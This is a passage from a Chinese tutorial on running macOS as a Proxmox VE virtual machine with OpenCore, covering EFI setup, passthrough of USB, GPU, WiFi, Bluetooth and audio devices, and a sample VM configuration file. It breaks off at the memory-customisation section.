\u200b\u6559\u7a0b\u200b\u91cc\u9762\u200b\u8be6\u7ec6\u200b\u5c55\u5f00\u200b\uff0c\u200b\u60f3\u200b\u6df1\u5165\u200b\u9ed1\u200b\u82f9\u679c\u200b\u7684\u200b\u7f51\u53cb\u200b\u53ef\u4ee5\u200b\u8f6c\u5230\u200b\u6211\u200b\u7684\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u9ed1\u200b\u82f9\u679c\u200b\u6559\u7a0b\u200b\uff1a\u200b\u56fd\u5149\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u6559\u7a0b\u200b\uff1a\u200b\u624b\u628a\u624b\u200b\u6559\u200b\u4f60\u200b\u914d\u7f6e\u200b OpenCore</p> <p>EFI \u200b\u662f\u200b\u9ed1\u200b\u82f9\u679c\u200b\u4e2d\u200b\u6700\u200b\u6838\u5fc3\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u5939\u200b\uff0c\u200b\u8fd9\u200b\u91cc\u9762\u200b\u5305\u542b\u200b\u7740\u200b\u673a\u5668\u200b\u76f8\u5173\u200b\u7684\u200b\u6240\u6709\u200b\u9a71\u52a8\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u4f7f\u7528\u200b\u4e86\u200b Github \u200b\u5f00\u6e90\u200b\u7684\u200b OpenCore \u200b\u955c\u50cf\u200b\u53ef\u4ee5\u200b\u5f15\u5bfc\u200b\u5b89\u88c5\u200b macOS \u200b\u7cfb\u7edf\u200b\u7684\u200b\u539f\u56e0\u200b\u4e86\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u90a3\u4e2a\u200b iso \u200b\u91cc\u9762\u200b\u5c01\u88c5\u200b\u4e86\u200b PVE \u200b\u865a\u62df\u673a\u200b\u7684\u200b\u76f8\u5173\u200b EFI \u200b\u9a71\u52a8\u200b\uff1a</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5462\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u80fd\u200b\u4e00\u76f4\u200b\u4f7f\u7528\u200b CD \u200b\u5149\u76d8\u200b\u6765\u200b\u5f15\u5bfc\u200b\u7cfb\u7edf\u200b\u5427\u200b\uff0c\u200b\u4e3b\u8981\u200b\u539f\u56e0\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u5b98\u65b9\u200b\u9879\u76ee\u200b\u7684\u200b EFI \u200b\u6709\u5f85\u200b\u5b9a\u5236\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e00\u4e9b\u200b\u72ec\u663e\u200b\u53c2\u6570\u200b\u4f18\u5316\u200b\u5565\u200b\u7684\u200b\u90fd\u200b\u7f3a\u5931\u200b</li> <li>\u200b\u5b98\u65b9\u200b\u7684\u200b EFI \u200b\u6302\u8f7d\u200b\u5728\u200b\u5149\u76d8\u200b\u91cc\u9762\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f53\u505a\u200b\u5907\u4efd\u200b\uff0c\u200b\u5e73\u65f6\u200b\u6211\u4eec\u200b\u6539\u200b\u653e\u5230\u200b\u786c\u76d8\u200b\u672c\u5730\u200b\u7684\u200b EFI \u200b\u5c31\u884c\u4e86\u200b</li> <li>VM \u200b\u865a\u62df\u673a\u200b\u4e00\u76f4\u200b\u63d2\u200b\u7740\u200b\u5149\u76d8\u200b\u4e0d\u200b\u4f18\u96c5\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b\u7269\u7406\u200b\u673a\u200b\u542f\u52a8\u200b\u7cfb\u7edf\u200b\u4e00\u76f4\u200b\u63d2\u200b\u7740\u200b U \u200b\u76d8\u200b\u4e00\u6837\u200b\uff0c\u200b\u592a\u200b\u6ed1\u7a3d\u200b\u4e86\u200b  </li> </ol>"},{"location":"7/4/#efi","title":"EFI \u200b\u5f52\u4f4d","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u628a\u200b\u8fd9\u4e2a\u200b OpenCore \u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u7684\u200b EFI \u200b\u5f15\u5bfc\u200b\u6587\u4ef6\u5939\u200b\u62f7\u8d1d\u5230\u200b\u786c\u76d8\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u7cfb\u7edf\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u597d\u200b\u4e86\u200b\uff0c\u200b\u5f00\u673a\u200b\u524d\u200b\u6211\u4eec\u200b\u5148\u79fb\u200b\u9664\u6389\u200b\u4e4b\u524d\u200b\u6302\u8f7d\u200b\u7684\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u955c\u50cf\u200b\uff0c\u200b\u53ea\u200b\u4fdd\u7559\u200b OpenCore \u200b\u5f15\u5bfc\u200b\u955c\u50cf\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u8fdb\u200b\u7cfb\u7edf\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b OpenCore Configurator \u200b\u6302\u8f7d\u200b\u786c\u76d8\u200b \u200b\u4ee5\u53ca\u200b ISO \u200b\u5149\u76d8\u200b\u540e\u200b\uff0c\u200b\u76f4\u63a5\u200b\u5c06\u200b ISO \u200b\u5149\u76d8\u200b\u7684\u200b EFI \u200b\u62f7\u8d1d\u5230\u200b\u786c\u76d8\u200b\u91cc\u9762\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> \u200b\u5982\u679c\u200b OCC \u200b\u8f6f\u4ef6\u200b\u65e0\u6cd5\u200b\u6253\u5f00\u200b\u7684\u8bdd\u200b......  \u200b\u70b9\u51fb\u200b\u5c55\u5f00\u200b\u89e3\u51b3\u529e\u6cd5\u200b \ud83d\udc49 <p>\u200b\u5bf9\u200b\u7b2c\u4e00\u6b21\u200b\u4f7f\u7528\u200b\u82f9\u679c\u200b\u7684\u200b\u7528\u6237\u200b\u53ef\u80fd\u200b\u6bd4\u8f83\u200b\u4e0d\u200b\u53cb\u597d\u200b\uff0c\u200b\u76f4\u63a5\u200b\u6253\u5f00\u200b\u53ef\u80fd\u200b\u770b\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u63d0\u793a\u200b\uff1a  \u200b\u6709\u200b\u4e24\u79cd\u200b\u89e3\u51b3\u529e\u6cd5\u200b\uff1a 1. \u200b\u4e0b\u56fe\u200b\u5de6\u8fb9\u200b\u8fd9\u79cd\u200b\uff0c\u200b\u76f4\u63a5\u200b\u9f20\u6807\u200b\u53f3\u952e\u200b\uff0c\u200b\u70b9\u51fb\u200b\u6253\u5f00\u200b\u5373\u53ef\u200b 2. \u200b\u4e0b\u56fe\u200b\u53f3\u8fb9\u200b\u8fd9\u79cd\u200b\uff0c\u200b\u5148\u200b\u6253\u5f00\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5931\u8d25\u200b\u540e\u200b\u5230\u200b\u300c\u200b\u8bbe\u7f6e\u200b\u300d-\u300c\u200b\u5b89\u5168\u200b\u4e0e\u200b\u9690\u79c1\u200b\u300d-\u300c\u200b\u901a\u7528\u200b\u300d\u200b\u91cc\u9762\u200b\u70b9\u51fb\u200b\u65e0\u8bba\u5982\u4f55\u200b\u6253\u5f00\u200b\u5c31\u884c\u200b\uff1a  </p> <p>\u200b\u62f7\u8d1d\u200b\u5b8c\u6210\u200b\u540e\u200b\u5173\u673a\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u79fb\u9664\u200b OpenCore ISO \u200b\u955c\u50cf\u200b\u4e86\u200b\uff0c\u200b\u7136\u540e\u200b\u5e94\u8be5\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u8fdb\u5165\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u653e\u5165\u200b\u5230\u200b\u786c\u76d8\u200b\u7684\u200b EFI \u200b\u5f00\u59cb\u200b\u751f\u6548\u200b\u4e86\u200b\u3002\u200b\u4e4b\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7f16\u8f91\u200b\u672c\u5730\u200b\u7684\u200b EFI \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b\u7269\u7406\u200b\u673a\u9ed1\u200b\u82f9\u679c\u200b\u90a3\u6837\u200b\uff1a</p> <p> </p> <p>\u200b\u6709\u200b\u9ed1\u200b\u82f9\u679c\u200b\u57fa\u7840\u200b\u7684\u200b\u540c\u5b66\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f18\u5316\u200b EFI \u200b\u914d\u7f6e\u200b\uff0c\u200b\u6216\u8005\u200b\u5347\u7ea7\u200b OC \u200b\u7248\u672c\u200b\uff0c\u200b\u6ca1\u6709\u200b\u57fa\u7840\u200b\u7684\u200b\u540c\u5b66\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u6211\u200b\u5199\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u6559\u7a0b\u200b\u6162\u6162\u6765\u200b\uff1a\u200b\u56fd\u5149\u200b\u7684\u200b\u9ed1\u200b\u82f9\u679c\u200b\u5b89\u88c5\u200b\u6559\u7a0b\u200b\uff1a\u200b\u624b\u628a\u624b\u200b\u6559\u200b\u4f60\u200b\u914d\u7f6e\u200b OpenCore </p> <p>\u200b\u6240\u4ee5\u200b\u4e0b\u9762\u200b\u6559\u7a0b\u200b\u56fd\u5149\u200b\u6211\u200b\u53ea\u200b\u4f18\u5316\u200b\u4e00\u4e9b\u200b\u57fa\u7840\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u8fdb\u9636\u200b\u7684\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u5927\u5bb6\u200b\u81ea\u5df1\u200b\u82b1\u200b\u65f6\u95f4\u200b\u7422\u78e8\u200b\u7814\u7a76\u200b\u3002</p>"},{"location":"7/4/#usb","title":"\u76f4\u901a\u200b USB","text":"<p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff0c\u200b\u76ee\u524d\u200b\u901a\u8fc7\u200b PVE \u200b\u7684\u200b Web \u200b\u754c\u9762\u200b\u64cd\u4f5c\u200b\u6211\u4eec\u200b\u7684\u200b\u952e\u9f20\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u6709\u200b\u5ef6\u8fdf\u200b\u7684\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u8fd8\u662f\u200b\u8d70\u5f97\u200b VNC \u200b\u7f51\u7edc\u200b\u4f20\u8f93\u200b\u534f\u8bae\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u66f4\u597d\u200b\u7684\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u952e\u9f20\u200b\u76f4\u901a\u200b\u5230\u200b PVE \u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\uff1a</p> <p>PVE \u200b\u652f\u6301\u200b\u51e0\u79cd\u200b USB \u200b\u8bbe\u5907\u200b\u6dfb\u52a0\u200b\uff0c\u200b\u4e0b\u9762\u200b\u7b80\u5355\u200b\u6311\u7740\u200b\u89e3\u91ca\u4e00\u4e0b\u200b\uff1a</p> <ul> <li> \u200b\u4f7f\u7528\u200b USB \u200b\u4f9b\u5e94\u5546\u200b / \u200b\u8bbe\u5907\u200b ID<ul> <li>\u200b\u6839\u636e\u200b\u4f60\u200b\u7684\u200b\u8bbe\u5907\u200b\u540d\u79f0\u200b\u6dfb\u52a0\u200b</li> <li>\u200b\u5c31\u7b97\u200b\u4f60\u200b\u7684\u200b USB \u200b\u62d4\u6389\u200b\u6362\u200b\u5176\u4ed6\u200b\u63a5\u53e3\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u76f4\u901a\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u7684\u200b</li> </ul> </li> <li> \u200b\u4f7f\u7528\u200b USB \u200b\u7aef\u53e3\u200b<ul> <li>\u200b\u6839\u636e\u200b USB \u200b\u7269\u7406\u200b\u7aef\u53e3\u200b\u6dfb\u52a0\u200b</li> <li>\u200b\u4f60\u200b\u8fd9\u4e2a\u200b\u63a5\u53e3\u200b\u63d2\u200b\u9f20\u6807\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9f20\u6807\u200b\u5c31\u200b\u76f4\u901a\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u4e86\u200b\uff1b\u200b\u63d2\u200b\u952e\u76d8\u200b\uff0c\u200b\u90a3\u4e48\u200b\u952e\u76d8\u200b\u5c31\u200b\u76f4\u901a\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u4e86\u200b</li> <li>\u200b\u6839\u636e\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u52fe\u9009\u200b\uff0cUSB3 \u200b\u662f\u200b USB2 \u200b\u548c\u200b USB3 \u200b\u7684\u200b\u5408\u4f53\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b \u200b\u7269\u7406\u200b\u7aef\u53e3\u200b\u662f\u200b USB 3 \u200b\u8bf7\u200b\u52fe\u9009\u200b USB 3</li> </ul> </li> </ul> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u6211\u200b\u66f4\u200b\u504f\u5411\u200b\u4e8e\u200b\u524d\u8005\u200b\u8005\u200b\uff0c\u200b\u4f7f\u7528\u200b USB \u200b\u7684\u200b\u8bbe\u5907\u200b ID\uff1a</p> <p> </p>"},{"location":"7/4/#_2","title":"\u76f4\u901a\u200b\u72ec\u663e","text":"\u76f4\u901a\u200b\u72ec\u663e\u200b\u9700\u8981\u200b PVE \u200b\u672c\u8eab\u200b\u914d\u7f6e\u200b\u597d\u200b\u624d\u200b\u53ef\u4ee5\u200b <p>\u200b\u786e\u4fdd\u200b\u81ea\u5df1\u200b\u6309\u7167\u200b\u524d\u9762\u200b\u7684\u200b\u6559\u7a0b\u200b\uff1a\u200b\u56fd\u5149\u200b\u7684\u200b PVE &amp; Linux \u200b\u751f\u4ea7\u529b\u200b\u73af\u5883\u200b\u642d\u5efa\u200b\u6559\u7a0b\u200b - \u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b \u200b\u64cd\u4f5c\u200b\u5b8c\u540e\u200b\u518d\u200b\u8fdb\u884c\u200b\u76f4\u901a\u200b\u72ec\u663e\u200b\u64cd\u4f5c\u200b\u3002</p>"},{"location":"7/4/#_3","title":"\u72ec\u663e\u200b\u53c2\u6570","text":"<p>\u200b\u7136\u540e\u200b\u5173\u6389\u200b\u539f\u6765\u200b\u7684\u200b Vmware \u200b\u517c\u5bb9\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u786c\u4ef6\u200b\u5982\u4e0b\u200b\uff1a \u200b\u56e0\u4e3a\u200b OC \u200b\u5f15\u5bfc\u200b\u9ed1\u200b\u82f9\u679c\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f7f\u7528\u200b RX5500/5600/5700/6600/6800/6900 \u200b\u7cfb\u5217\u200b\u65b0\u200b\u7684\u200b\u514d\u9a71\u200b\u7cfb\u5217\u200b\u663e\u5361\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u4f1a\u200b\u9ed1\u5c4f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5148\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b\u6211\u4eec\u200b\u7684\u200b OC \u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u5728\u200b\u542f\u52a8\u9879\u200b\u6dfb\u52a0\u200b <code>agdpmod=pikera</code> \u200b\u53c2\u6570\u200b\uff1a </p> <p> </p> <p>\u200b\u4fdd\u5b58\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u540e\u200b\u5173\u95ed\u200b PVE \u200b\u9ed1\u200b\u82f9\u679c\u200b\u865a\u62df\u673a\u200b\u3002</p> <p>\u200b\u6dfb\u52a0\u200b PCI \u200b\u8bbe\u5907\u200b\uff0c\u200b\u627e\u5230\u200b\u6211\u4eec\u200b\u7684\u200b RX 6600XT \uff0c\u200b\u8fd9\u91cc\u200b\u6ca1\u6709\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\uff0c\u200b\u4f46\u662f\u200b Navi 23 \u200b\u786e\u5b9e\u200b\u662f\u200b\u8fd9\u4e2a\u200b\u663e\u5361\u200b\u7684\u200b\u67b6\u6784\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u52fe\u9009\u200b\u5982\u4e0b\u200b\u9009\u9879\u200b\uff1a</p> <p> </p>"},{"location":"7/4/#romfile","title":"\u6307\u5b9a\u200b romfile","text":"<p>\u200b\u63a5\u7740\u200b\u6211\u4eec\u200b\u7f16\u8f91\u200b VM \u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u8ba9\u200b\u663e\u5361\u200b\u52a0\u8f7d\u200b\u5230\u200b\u4e0a\u200b\u4f20\u5230\u200b PVE \u200b\u91cc\u9762\u200b\u7684\u200b ROM\uff1a</p> <p>Bash<pre><code>nano /etc/pve/qemu-server/103.conf \n</code></pre> \u200b\u5728\u200b\u663e\u5361\u200b\u7684\u200b PCIe \u200b\u9009\u9879\u200b\u4e2d\u200b\u6dfb\u52a0\u200b <code>romfile=xxxx.rom</code> \u200b\u53c2\u6570\u200b\u5373\u53ef\u200b</p> PVE \u200b\u4e0b\u200b\u5b58\u653e\u200b ROM \u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\u4e3a\u200b <code>/usr/share/kvm/</code> <p>\u200b\u4f7f\u7528\u200b SCP \u200b\u547d\u4ee4\u200b\u5c06\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u663e\u5361\u200b\u4e2d\u200b\u63d0\u53d6\u200b\u7684\u200b ROM \u200b\u6216\u8005\u200b\u5b98\u7f51\u200b\u4e0b\u8f7d\u200b\u7684\u200b ROM \u200b\u6587\u4ef6\u200b\u653e\u5165\u200b\u5230\u200b PVE \u200b\u7684\u200b /usr/share/kvm/ \u200b\u4e0b\u200b  </p> <p>\u200b\u7136\u540e\u200b\u5173\u6389\u200b\u539f\u6765\u200b\u7684\u200b Vmware \u200b\u517c\u5bb9\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u786c\u4ef6\u200b\u5982\u4e0b\u200b\uff1a</p> /etc/pve/qemu-server/103.conf<pre><code>agent: 1\nargs: -device isa-applesmc,osk=\"ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc\" -smbios type=2 -device usb-kbd,bus=ehci.0,port=2 -cpu host,kvm=on,vendor=GenuineIntel,+kvm_pv_unhalt,+kvm_pv_eoi,+hypervisor,+invtsc\nballoon: 0\nbios: ovmf\nboot: order=sata0\ncores: 16\ncpu: host\nefidisk0: local-lvm:vm-103-disk-0,efitype=4m,size=4M\nhostpci0: 0000:85:00,romfile=RX6600XT.rom,x-vga=1 # (1)\nmachine: q35\nmemory: 32768\nmeta: creation-qemu=7.1.0,ctime=1670939163\nname: macOS-Monterey\nnet0: virtio=92:1A:24:B9:6B:EE,bridge=vmbr2,firewall=1\nnuma: 1\nostype: other\nsata0: ssd3-nvme-2tb-WD-AN1500:103/vm-103-disk-0.qcow2,cache=unsafe,discard=on,size=320G,ssd=1\nscsihw: virtio-scsi-single\nsmbios1: uuid=2896b313-d40d-41ab-a288-8ea8df452dfb\nsockets: 1\nusb0: host=046d:c092\nusb1: host=0f39:0611\nvga: none\nvmgenid: ca66aaea-9bd3-4312-88b7-1ba05e7eaadd\n</code></pre> <ol> <li>\u200b\u4e3b\u8981\u200b\u5c31\u662f\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u8fd9\u4e2a\u200b romfile=RX6600XT.rom \u200b\u53c2\u6570\u200b</li> </ol> <p>\u200b\u90e8\u5206\u200b\u663e\u5361\u200b\u4e0d\u200b\u9700\u8981\u200b romfile \u200b\u53c2\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b</p> <ol> <li>AMD RX400\u3001RX500 \u200b\u7cfb\u5217\u200b\u6d4b\u8bd5\u200b\u65e0\u9700\u200b romfile \u200b\u53c2\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b</li> <li>AMD RX5000\u3001RX6000 \u200b\u7cfb\u5217\u200b\u5927\u591a\u6570\u200b\u9700\u8981\u200b romfile \u200b\u53c2\u6570\u200b\u624d\u200b\u53ef\u4ee5\u200b\u987a\u5229\u200b\u76f4\u901a\u200b</li> </ol>"},{"location":"7/4/#_4","title":"\u76f4\u901a\u200b\u6548\u679c","text":"<p>\u200b\u6700\u7ec8\u200b\u76f4\u901a\u200b\u540e\u8fdb\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6b64\u65f6\u200b\u63d2\u200b\u5728\u200b 6600XT \u200b\u663e\u5361\u200b\u4e0a\u200b\u7684\u200b\u663e\u793a\u5668\u200b\u4f1a\u200b\u6b63\u5e38\u200b\u70b9\u4eae\u200b\uff0c\u200b\u4f7f\u7528\u200b\u952e\u9f20\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5c31\u200b\u548c\u200b\u7269\u7406\u200b\u673a\u9ed1\u200b\u82f9\u679c\u200b\u7684\u200b\u4f53\u9a8c\u200b\u662f\u200b\u5dee\u4e0d\u591a\u200b\u7684\u200b\uff1a</p> <p> </p>"},{"location":"7/4/#_5","title":"\u76f4\u901a\u200b\u7f51\u5361","text":""},{"location":"7/4/#wifi","title":"\u76f4\u901a\u200b WiFi","text":"<p>\u200b\u56e0\u4e3a\u200b\u6211\u200b\u7684\u200b BCM94360CD \u200b\u63d2\u200b\u7684\u200b\u4e5f\u200b\u662f\u200b PCIe \u200b\u63a5\u53e3\u200b\uff0c\u200b\u800c\u4e14\u200b\u662f\u200b\u514d\u9a71\u200b\u65e0\u7ebf\u200b\u7f51\u5361\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u518d\u200b\u989d\u5916\u200b\u4fee\u6539\u200b EFI \u200b\u6587\u4ef6\u200b\u3002\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5728\u200b PCI \u200b\u8bbe\u5907\u200b\u91cc\u9762\u200b\u627e\u5230\u200b\u6211\u4eec\u200b\u7684\u200b\u65e0\u7ebf\u200b\u7f51\u5361\u200b\uff1a</p> <p> </p> <p>\u200b\u4e5f\u200b\u7ed9\u200b\u4ed6\u200b\u6dfb\u52a0\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\uff1a</p> <p> </p> <p>\u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b</p> <p>\u200b\u5982\u679c\u200b\u4e0a\u200b\u56fe\u200b\u8fd9\u6837\u200b\u76f4\u901a\u200b WiFi \u200b\u65e0\u7ebf\u200b\u7f51\u5361\u200b\u5931\u8d25\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e0d\u59a8\u200b\u53ea\u200b\u52fe\u9009\u200b\u300c\u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u300d\u200b\u548c\u200b\u300cROM-Bar\u300d\u200b\u6216\u8005\u200b\u53ea\u200b\u52fe\u9009\u200b\u300c\u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u300d</p>"},{"location":"7/4/#_6","title":"\u76f4\u901a\u200b\u84dd\u7259","text":"<p>\u200b\u8981\u200b\u60f3\u200b\u5b9e\u73b0\u200b\u514d\u9a71\u200b\u7f51\u5361\u200b\u7684\u200b\u6240\u6709\u200b\u529f\u80fd\u200b\uff0c\u200b\u5149\u6709\u200b WiFi \u200b\u662f\u200b\u4e0d\u591f\u200b\u7684\u200b\uff0c\u200b\u84dd\u7259\u200b\u4e5f\u200b\u5f97\u200b\u9700\u8981\u200b\u76f4\u901a\u200b\u8fdb\u53bb\u200b\uff0c\u200b\u84dd\u7259\u200b\u8d70\u200b\u7684\u200b\u662f\u200b USB \u200b\u534f\u8bae\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5728\u200b USB \u200b\u8bbe\u5907\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u6211\u4eec\u200b\u7684\u200b\u84dd\u7259\u200b\u8bbe\u5907\u200b\uff1a</p> <p></p> <p>\u200b\u8bb0\u5f97\u200b\u53d6\u6d88\u200b USB3 \u200b\u52fe\u9009\u200b\u3002</p>"},{"location":"7/4/#_7","title":"\u76f4\u901a\u200b\u6548\u679c","text":"<p>WiFi\u3001\u200b\u84dd\u7259\u200b \u200b\u9694\u200b\u7a7a\u6295\u200b\u9001\u5747\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff1a</p> <p></p>"},{"location":"7/4/#_8","title":"\u76f4\u901a\u200b\u58f0\u5361","text":"<p>\u200b\u5176\u5b9e\u200b\u97f3\u9891\u8bbe\u5907\u200b\u4e0d\u200b\u6dfb\u52a0\u200b\u7684\u8bdd\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u5173\u7cfb\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u6211\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b\u7684\u200b\u4e24\u4e2a\u200b\u72ec\u663e\u200b\u662f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b DP/HDMI \u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u6570\u636e\u200b\u7684\u200b\uff0c\u200b\u9700\u8981\u200b\u76f4\u901a\u200b\u663e\u5361\u200b\u8d1f\u8d23\u200b HDMI/DP \u200b\u97f3\u9891\u200b\u4f20\u8f93\u200b\u7684\u200b PCIe \u200b\u8bbe\u5907\u200b\uff1a</p> <p></p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u84dd\u7259\u200b\u6765\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u6570\u636e\u200b\uff1a</p> <p> </p> <p>\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b\u4e0b\u56fe\u200b\u4e2d\u200b\u8fd9\u79cd\u200b USB \u200b\u58f0\u5361\u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u5927\u591a\u6570\u200b\u8fd9\u79cd\u200b USB \u200b\u58f0\u5361\u200b\u90fd\u200b\u662f\u200b\u514d\u9a71\u200b\u7684\u200b\uff0c\u200b\u76f4\u63a5\u200b UBS \u200b\u8bbe\u5907\u200b\u76f4\u901a\u200b\u5230\u200b\u865a\u62df\u673a\u200b\u91cc\u200b\u5373\u53ef\u200b\u4f7f\u7528\u200b\uff1a</p> <p> </p> <p>\u200b\u5f53\u7136\u200b\u6211\u4eec\u200b\u4e3b\u677f\u200b\u81ea\u5e26\u200b\u7684\u200b\u58f0\u5361\u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b\u7684\u200b\uff0c </p> <p> </p> <p> </p>"},{"location":"7/4/#_9","title":"\u673a\u578b\u200b\u8bbe\u7f6e","text":"<p>\u200b\u56e0\u4e3a\u200b\u6211\u200b\u8fd9\u4e2a\u200b\u53cc\u8def\u200b E5 \u200b\u6ca1\u6709\u200b\u6838\u663e\u200b\uff0c\u200b\u800c\u4e14\u200b\u5f88\u200b\u7b26\u5408\u200b\u5de5\u4f5c\u7ad9\u200b\u6027\u8d28\u200b\uff0c\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u6211\u200b\u5c06\u200b\u673a\u578b\u200b\u6362\u6210\u200b\u4e86\u200b MacPro7,1 CPU \u200b\u578b\u53f7\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u6362\u6210\u200b Mac Pro \u200b\u81ea\u5e26\u200b\u7684\u200b 3842 \u200b\u5373\u53ef\u200b\uff08CPU \u200b\u4ee3\u53f7\u200b\u9700\u8981\u200b\u81ea\u5df1\u200b\u67e5\u8868\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u8fd9\u200b\u5c5e\u4e8e\u200b\u8fdb\u9636\u200b\u6280\u80fd\u200b\uff0c\u200b\u56fd\u5149\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u5c55\u5f00\u200b\u8bf4\u200b\u4e86\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u6700\u7ec8\u200b\u673a\u578b\u200b\u548c\u200b CPU \u200b\u578b\u53f7\u200b\u6210\u529f\u200b\u8bc6\u522b\u200b\uff1a</p> <p> </p>"},{"location":"7/4/#_10","title":"\u5185\u5b58\u200b\u5b9a\u5236","text":"<p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u7f51\u53cb\u4f1a\u200b\u53d1\u73b0\u200b\u6211\u4eec\u200b\u7684\u200b MacPro 7,1 